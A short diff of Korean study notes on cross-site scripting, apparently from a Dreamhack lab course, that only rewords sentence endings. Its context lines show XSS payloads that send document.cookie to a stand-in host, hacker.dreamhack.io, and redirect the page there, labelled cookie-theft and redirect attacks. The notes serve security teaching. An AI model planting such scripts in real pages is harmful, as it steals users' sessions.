@@ -55,7 +55,7 @@ new  Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
 </script>
 ```
 
-위의 코드는 **쿠키 및 세션 탈취** 공격 코드이다.
+위의 코드는 **쿠키 및 세션 탈취** 공격 코드다.
 
 ```html
 <script>
@@ -80,7 +80,7 @@ window.open("http://hacker.dreamhack.io/")
 </script>
 ```
 
-위의 코드는 **위치 이동** 공격 코드이다.  
+위의 코드는 **위치 이동** 공격 코드다.  
 
 # Basic XSS Lab(개편 전 실습)
 ## Types of XSS: Wrapup
